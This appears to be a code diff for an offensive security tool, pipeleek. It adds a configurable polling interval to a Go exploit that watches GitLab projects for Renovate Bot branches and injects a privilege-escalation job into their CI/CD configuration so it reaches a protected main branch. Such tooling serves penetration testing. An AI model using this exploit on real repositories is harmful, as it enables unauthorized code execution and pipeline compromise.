@@ -1,6 +1,8 @@
 package renovate
 
 import (
+	"time"
+
 	"github.com/CompassSecurity/pipeleek/pkg/gitlab/util"
 	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
 	"github.com/rs/zerolog/log"
@@ -9,7 +11,7 @@ import (
 	"gopkg.in/yaml.v3"
 )
 
-func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex string) {
+func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex, monitoringIntervalStr string) {
 	log.Info().Msg("Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch")
 
 	git, err := util.GetGitlabClient(gitlabApiToken, gitlabUrl)
@@ -28,6 +30,11 @@ func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex strin
 		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex regex is invalid")
 	}
 
+	monitoringInterval, err := time.ParseDuration(monitoringIntervalStr)
+	if err != nil {
+		log.Fatal().Stack().Err(err).Str("interval", monitoringIntervalStr).Msg("Failed to parse monitoring-interval duration")
+	}
+
 	projectAccessLevel := getUserAccessLevel(project)
 	if projectAccessLevel < gogitlab.DeveloperPermissions {
 		log.Fatal().Any("projectAccessLevel", projectAccessLevel).Msg("You (probably) need at least Developer permissions to exploit this vulnerability, you must be able to push to the Renovate Bot created branches branches")
@@ -41,7 +48,7 @@ func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex strin
 	checkDefaultBranchProtections(git, project, projectAccessLevel)
 
 	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
-	branch := monitorBranches(git, project, branchMonitor)
+	branch := monitorBranches(git, project, branchMonitor, monitoringInterval)
 	cicd := getBranchCiCdYml(git, project, *branch)
 	log.Info().Str("branch", branch.Name).Msg("Modifying CI/CD configuration")
 	cicd["pipeleek-renovate-privesc"] = ci.JobConfig{
@@ -100,7 +107,7 @@ func checkDefaultBranchProtections(git *gogitlab.Client, project *gogitlab.Proje
 	log.Info().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("Default branch is protected and you do not have direct access, proceeding with exploit")
 }
 
-func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, branchMonitor *pkgrenovate.BranchMonitor) *gogitlab.Branch {
+func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, branchMonitor *pkgrenovate.BranchMonitor, monitoringInterval time.Duration) *gogitlab.Branch {
 	isFirstScan := true
 
 	for {
@@ -129,6 +136,7 @@ func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, branchMoni
 		}
 
 		isFirstScan = false
+		time.Sleep(monitoringInterval)
 	}
 }
 
